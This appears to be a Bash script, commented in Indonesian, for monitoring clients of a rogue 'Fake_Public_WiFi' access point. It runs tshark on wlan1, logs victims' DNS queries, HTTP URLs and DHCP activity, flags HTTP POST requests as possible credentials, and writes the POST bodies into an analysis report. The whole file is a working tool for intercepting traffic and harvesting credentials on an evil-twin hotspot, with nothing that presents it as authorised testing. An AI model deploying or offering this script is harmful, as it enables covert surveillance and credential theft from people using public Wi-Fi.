#!/bin/bash

# Script untuk live traffic monitoring dan analisis
# Menangkap traffic penting dari client yang connect ke Fake_Public_WiFi

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

echo -e "${BLUE}╔════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   Live Traffic Monitoring - Fake_Public_WiFi      ║${NC}"
echo -e "${BLUE}╔════════════════════════════════════════════════════╗${NC}"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}Error: Script harus dijalankan sebagai root (gunakan sudo)${NC}"
    exit 1
fi

# Buat direktori untuk hasil capture
CAPTURE_DIR="./captures"
mkdir -p "$CAPTURE_DIR"

# Timestamp untuk nama file
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
CAPTURE_FILE="${CAPTURE_DIR}/traffic_${TIMESTAMP}.pcap"
ANALYSIS_FILE="${CAPTURE_DIR}/analysis_${TIMESTAMP}.txt"

echo -e "${YELLOW}[1/3] Memulai packet capture...${NC}"
echo -e "${GREEN}✓ Capture file: ${CAPTURE_FILE}${NC}"
echo -e "${GREEN}✓ Analysis file: ${ANALYSIS_FILE}${NC}"
echo ""

# Start tshark untuk capture di background
tshark -i wlan1 -w "$CAPTURE_FILE" -q &
TSHARK_PID=$!

echo -e "${GREEN}✓ Packet capture dimulai (PID: $TSHARK_PID)${NC}"
echo ""

# Buat file analisis
cat > "$ANALYSIS_FILE" << EOF
=================================================================
TRAFFIC ANALYSIS REPORT - Fake_Public_WiFi
=================================================================
Capture Time: $(date)
Interface: wlan1
Capture File: $CAPTURE_FILE

=================================================================
LIVE MONITORING RESULTS
=================================================================

EOF

echo -e "${YELLOW}[2/3] Memulai live analysis...${NC}"
echo -e "${BLUE}Monitoring traffic dari client... (Tekan Ctrl+C untuk stop)${NC}"
echo ""
echo -e "${MAGENTA}═══════════════════════════════════════════════════${NC}"

# Counter untuk statistik
HTTP_COUNT=0
DNS_COUNT=0
DHCP_COUNT=0
POST_COUNT=0

# Live monitoring dengan tshark
tshark -i wlan1 -Y "ip.src == 10.0.0.0/24 or ip.dst == 10.0.0.0/24" -T fields \
    -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e udp.dstport \
    -e http.request.method -e http.host -e http.request.uri \
    -e dns.qry.name -e dhcp.option.dhcp \
    2>/dev/null | while IFS=$'\t' read -r timestamp src dst tcp_port udp_port http_method http_host http_uri dns_query dhcp_type; do
    
    # DHCP Detection
    if [ ! -z "$dhcp_type" ]; then
        ((DHCP_COUNT++))
        echo -e "${GREEN}[DHCP]${NC} $src → DHCP Request: $dhcp_type"
        echo "[DHCP] Time: $timestamp | Client: $src | Type: $dhcp_type" >> "$ANALYSIS_FILE"
    fi
    
    # DNS Detection
    if [ ! -z "$dns_query" ]; then
        ((DNS_COUNT++))
        echo -e "${BLUE}[DNS]${NC} $src → Query: ${YELLOW}$dns_query${NC}"
        echo "[DNS] Time: $timestamp | Client: $src | Query: $dns_query" >> "$ANALYSIS_FILE"
    fi
    
    # HTTP Detection
    if [ ! -z "$http_method" ]; then
        ((HTTP_COUNT++))
        if [ "$http_method" == "POST" ]; then
            ((POST_COUNT++))
            echo -e "${RED}[HTTP POST]${NC} $src → ${YELLOW}$http_host$http_uri${NC} ${RED}⚠ POSSIBLE CREDENTIALS!${NC}"
            echo "[HTTP POST] Time: $timestamp | Client: $src | URL: http://$http_host$http_uri | ⚠ CHECK FOR CREDENTIALS" >> "$ANALYSIS_FILE"
        else
            echo -e "${YELLOW}[HTTP $http_method]${NC} $src → $http_host$http_uri"
            echo "[HTTP $http_method] Time: $timestamp | Client: $src | URL: http://$http_host$http_uri" >> "$ANALYSIS_FILE"
        fi
    fi
    
done &
MONITOR_PID=$!

# Trap untuk cleanup saat Ctrl+C
trap cleanup INT

cleanup() {
    echo ""
    echo ""
    echo -e "${MAGENTA}═══════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}[3/3] Menghentikan monitoring dan membuat summary...${NC}"
    
    # Kill processes
    kill $TSHARK_PID 2>/dev/null
    kill $MONITOR_PID 2>/dev/null
    
    sleep 2
    
    # Generate summary
    echo "" >> "$ANALYSIS_FILE"
    echo "=================================================================" >> "$ANALYSIS_FILE"
    echo "CAPTURE SUMMARY" >> "$ANALYSIS_FILE"
    echo "=================================================================" >> "$ANALYSIS_FILE"
    echo "Total DHCP Requests: $DHCP_COUNT" >> "$ANALYSIS_FILE"
    echo "Total DNS Queries: $DNS_COUNT" >> "$ANALYSIS_FILE"
    echo "Total HTTP Requests: $HTTP_COUNT" >> "$ANALYSIS_FILE"
    echo "Total HTTP POST (Possible Credentials): $POST_COUNT" >> "$ANALYSIS_FILE"
    echo "" >> "$ANALYSIS_FILE"
    
    # Detailed packet analysis
    echo "=================================================================" >> "$ANALYSIS_FILE"
    echo "DETAILED PACKET STATISTICS" >> "$ANALYSIS_FILE"
    echo "=================================================================" >> "$ANALYSIS_FILE"
    
    if [ -f "$CAPTURE_FILE" ]; then
        # Protocol hierarchy
        echo "" >> "$ANALYSIS_FILE"
        echo "--- Protocol Hierarchy ---" >> "$ANALYSIS_FILE"
        tshark -r "$CAPTURE_FILE" -q -z io,phs 2>/dev/null >> "$ANALYSIS_FILE"
        
        # HTTP requests detail
        echo "" >> "$ANALYSIS_FILE"
        echo "--- All HTTP Requests ---" >> "$ANALYSIS_FILE"
        tshark -r "$CAPTURE_FILE" -Y "http.request" -T fields \
            -e ip.src -e http.request.method -e http.host -e http.request.uri \
            2>/dev/null | awk '{print "Client: "$1" | "$2" http://"$3$4}' >> "$ANALYSIS_FILE"
        
        # DNS queries detail
        echo "" >> "$ANALYSIS_FILE"
        echo "--- All DNS Queries ---" >> "$ANALYSIS_FILE"
        tshark -r "$CAPTURE_FILE" -Y "dns.qry.name" -T fields \
            -e ip.src -e dns.qry.name 2>/dev/null | sort -u | \
            awk '{print "Client: "$1" → "$2}' >> "$ANALYSIS_FILE"
        
        # Potential credentials (HTTP POST)
        echo "" >> "$ANALYSIS_FILE"
        echo "--- ⚠ POTENTIAL CREDENTIALS (HTTP POST) ---" >> "$ANALYSIS_FILE"
        tshark -r "$CAPTURE_FILE" -Y "http.request.method == POST" -T fields \
            -e ip.src -e http.host -e http.request.uri -e http.file_data \
            2>/dev/null | head -20 >> "$ANALYSIS_FILE"
    fi
    
    echo "" >> "$ANALYSIS_FILE"
    echo "=================================================================" >> "$ANALYSIS_FILE"
    echo "End of Report - $(date)" >> "$ANALYSIS_FILE"
    echo "=================================================================" >> "$ANALYSIS_FILE"
    
    # Display summary
    echo ""
    echo -e "${GREEN}✓ Monitoring selesai!${NC}"
    echo ""
    echo -e "${BLUE}═══════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}HASIL CAPTURE:${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════${NC}"
    echo -e "📁 Capture file: ${YELLOW}$CAPTURE_FILE${NC}"
    echo -e "📄 Analysis file: ${YELLOW}$ANALYSIS_FILE${NC}"
    echo ""
    echo -e "${GREEN}STATISTIK:${NC}"
    echo -e "  • DHCP Requests: ${YELLOW}$DHCP_COUNT${NC}"
    echo -e "  • DNS Queries: ${YELLOW}$DNS_COUNT${NC}"
    echo -e "  • HTTP Requests: ${YELLOW}$HTTP_COUNT${NC}"
    echo -e "  • HTTP POST (Credentials): ${RED}$POST_COUNT${NC}"
    echo ""
    echo -e "${YELLOW}Untuk melihat detail analisis:${NC}"
    echo -e "  cat $ANALYSIS_FILE"
    echo ""
    echo -e "${YELLOW}Untuk membuka di Wireshark:${NC}"
    echo -e "  wireshark $CAPTURE_FILE"
    echo ""
    
    exit 0
}

# Wait for Ctrl+C
wait $MONITOR_PID
